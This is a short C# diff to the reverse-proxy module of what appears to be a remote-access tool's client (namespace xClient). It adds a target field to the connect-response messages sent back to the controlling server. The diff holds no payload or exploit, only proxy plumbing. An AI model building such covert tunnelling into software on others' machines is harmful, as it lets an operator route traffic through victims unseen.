@@ -46,16 +46,16 @@ namespace xClient.Core.ReverseProxy
                 }
                 catch
                 {
-                    new ReverseProxyConnectResponse(ConnectionId, false, 0, 0).Execute(Client);
+                    new ReverseProxyConnectResponse(ConnectionId, false, 0, 0, this.Target).Execute(Client);
                     Disconnect();
                 }
 
                 IPEndPoint localEndPoint = (IPEndPoint)this.Handle.LocalEndPoint;
-                new ReverseProxyConnectResponse(ConnectionId, true, localEndPoint.Address.Address, localEndPoint.Port).Execute(Client);
+                new ReverseProxyConnectResponse(ConnectionId, true, localEndPoint.Address.Address, localEndPoint.Port, this.Target).Execute(Client);
             }
             else
             {
-                new ReverseProxyConnectResponse(ConnectionId, false, 0, 0).Execute(Client);
+                new ReverseProxyConnectResponse(ConnectionId, false, 0, 0, this.Target).Execute(Client);
             }
         }
 
